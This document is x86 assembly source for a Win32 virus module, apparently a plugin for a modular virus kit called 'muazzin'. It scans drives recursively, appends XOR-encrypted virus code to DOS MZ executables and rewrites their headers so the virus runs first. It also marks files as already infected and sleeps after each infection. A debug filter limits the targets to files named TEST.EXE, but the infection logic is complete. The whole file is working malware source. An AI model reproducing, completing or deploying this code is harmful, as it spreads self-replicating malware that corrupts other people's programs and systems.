.586p
.model   flat
locals __
jumps

by  equ byte ptr
wo  equ word ptr
dwo equ dword ptr
ofs equ offset

.xlist
include \inc\win32api.inc
include \inc\mz.inc
.list
include \muazzin\muazzin.asi

.data
       dd 12345678h

.code

_TYPE    = "exei"
_VERSION = 0105h

start:
       mov esi, [esp+4]
       test dwo [esi+m_why], MT_APP
       jz __query
       xchg edi, esi
       call delta
       mov eax, [edi+GPA]
       mov [esi+getpaddr], eax
       mov eax, [edi+GMH]
       mov [esi+getmhnd], eax
       pushad
       mov ecx, [edi+m_droppersize]
       mov [esi+dropper_size], ecx
       mov edi, [edi+m_dropper]
       call delta
       add esi, ofs buffer
       xchg esi, edi
       rep movsb
       call get_apis
       call delta
       add esi, ofs callback
       push esi
       call busca_recursiva
       popad
  __fuck:
       mov dwo [esi+m_result], MR_DONE
  __done:
       ret 4
  __query:
       test dwo [esi+m_why], MT_QUERY
       jz __fuck
       mov esi, MT_QUERY+MT_APP
       mov ebx, _TYPE
       mov ecx, _VERSION
       mov eax, MR_DONE
       jmp __done

callback:
       pushad
       call delta
       push 1000
       call [esi+Sleep]
       mov esi, [esp+(8*4)+4]
       mov edx, esi
  __search0:
       lodsb
       test al, al
       jne __search0
       mov edi, esi

       mov eax, [edi-9]
       and eax, not 020202020h          ;DEBUG CODE!
       cmp eax, "TSET"
       jne __isnt

       mov eax, [edi-5]
       and eax, not 020202000h
       cmp eax, "EXE."
       jne __isnt
       call infect_dos_exe
  __isnt:
       popad
       ret 4

delta:
       call __delta
  __delta:
       pop esi
       sub esi, ofs __delta
       ret

get_apis:
       call delta
       lea eax,[esi+krnl]
       push eax
       call [esi+getmhnd]
       mov ebp, eax
       push esi
       add esi, ofs GetDriveType
       mov edi, esi
  __next:
       lodsd
       test eax, eax
       jz __allgot
       mov edx, [esp]
       add eax, edx
       push eax
       push ebp
       call [edx+getpaddr]
       stosd
       jmp __next
  __allgot:
       pop eax
       ret

infect_dos_exe:
       push edx
       call delta
       mov dwo [esi+__exitcode],0
       call [esi+GetTickCount]
       mov by [esi+dos_code+1dh], al
       shr eax, 8
       mov wo [esi+dos_code+4], ax
       pop edx
       call fopen_rw
       jc __error
       xchg eax, ebx
       sub esp, IMAGE_SIZEOF_DOS_HEADER
       call fgetsize
       mov ebp, eax
       sub eax, 4096
       jc __error1
       mov edx, esp
       mov ecx, IMAGE_SIZEOF_DOS_HEADER
       call fread
       jc __error1
       mov ax, [edx.MZ_cs]
       mov wo [esi+buffer-2], ax
       mov ax, [edx.MZ_ip]
       mov wo [esi+buffer-4], ax
       cmp ax, 2            ;already infected
       je __error1
       mov ax, [edx.MZ_ss]
       mov wo [esi+buffer-10], ax
       mov ax, [edx.MZ_sp]
       mov wo [esi+buffer-13], ax
       cmp wo [edx.MZ_magic], IMAGE_DOS_SIGNATURE
       jne __error1
       cmp wo [edx.MZ_lfarlc], 40h
       jnb __error1
       movzx eax, wo [edx.MZ_cp]
       movzx ecx, wo [edx.MZ_cblp]
       jecxz __minus1
       dec eax
  __minus1:
       shl eax, 9
       add eax, ecx
       sub ebp, eax                             ;overlay present?
       jnz __error1
       add eax, 15
       and eax, not 15                  ;align 16
       mov edx, eax
       call fseek
       mov edi, eax                     ;edi=offset of viruscode
       lea edx, [esi+ofs dos_code]
       mov ecx, 12345678h
  dropper_size equ dwo $-4
       mov wo [esi+dos_code], cx
       add ecx, ofs buffer-ofs dos_code
       lea eax, [ecx+1024]
       mov wo [esp.MZ_sp], ax           ;stack 1k after virus end
       call mess
       call fwrite
       mov ax, wo [esi+dos_code+4]
       xor wo [esi+dos_code], ax
       call mess
       mov eax, edi
       shr eax, 4
       sub ax, [esp.MZ_cparhdr]
       mov wo [esp.MZ_cs], ax
       mov wo [esp.MZ_ss], ax
       mov wo [esp.MZ_ip], 2
       call fseekend
       mov edx, eax
       and eax, not 511
       sub edx, eax
       shr eax, 9
       test edx, edx
       jz __zkip
       inc eax
  __zkip:
       mov wo [esp.MZ_cp], ax
       mov wo [esp.MZ_cblp], dx
       sub edx, edx            ;seek start
       call fseek
       mov edx, esp
       mov ecx, IMAGE_SIZEOF_DOS_HEADER
       call fwrite                       ;write dos header
       mov dwo [esi+__exitcode],-1
  __error1:
       add esp, IMAGE_SIZEOF_DOS_HEADER
       call fclose
       mov ecx, 12345678h
  __exitcode equ $-4
       jecxz __error
       push 1000*60
       call delta
       call [esi+Sleep]
  __error:
       ret


mess:
       pushad
       movzx ecx, wo [esi+dos_code]
       add ecx, (buffer-dos_code)-22h
       lea ebx, [esi+dos_code+22h]
       mov ax, wo [esi+dos_code+4]
       xor wo [esi+dos_code], ax
       mov al, by [esi+dos_code+1dh]
  __da_loop:
       xor by [ebx], ah
       add ah, al
       inc ebx
       loop __da_loop
       popad
       ret

include \muazzin\samples\search.asi
include \muazzin\samples\fioexlow.asi

getmhnd              dd 0
getpaddr             dd 0

GetDriveType         dd ofs api001
SetCurrentDirectoryA dd ofs api002
FindFirstFileA       dd ofs api003
FindNextFileA        dd ofs api004
FindClose            dd ofs api005
SetLastError         dd ofs api006
GetLastError         dd ofs api007
CreateFileA          dd ofs api008
CloseHandle          dd ofs api009
SetFilePointer       dd ofs api010
WriteFile            dd ofs api011
ReadFile             dd ofs api012
SetFileAttributesA   dd ofs api013
GetFileSize          dd ofs api014
Sleep                dd ofs api015
GetTickCount         dd ofs api016
                     dd 0

krnl   db "KERNEL32.DLL",0

api001 db "GetDriveTypeA", 0
api002 db "SetCurrentDirectoryA", 0
api003 db "FindFirstFileA", 0
api004 db "FindNextFileA", 0
api005 db "FindClose", 0
api006 db "SetLastError", 0
api007 db "GetLastError", 0
api008 db "CreateFileA", 0
api009 db "CloseHandle", 0
api010 db "SetFilePointer", 0
api011 db "WriteFile", 0
api012 db "ReadFile", 0
api013 db "SetFileAttributesA", 0
api014 db "GetFileSize", 0
api015 db "Sleep", 0
api016 db "GetTickCount", 0

dos_code:
include dosexe.inc

buffer:

end    start
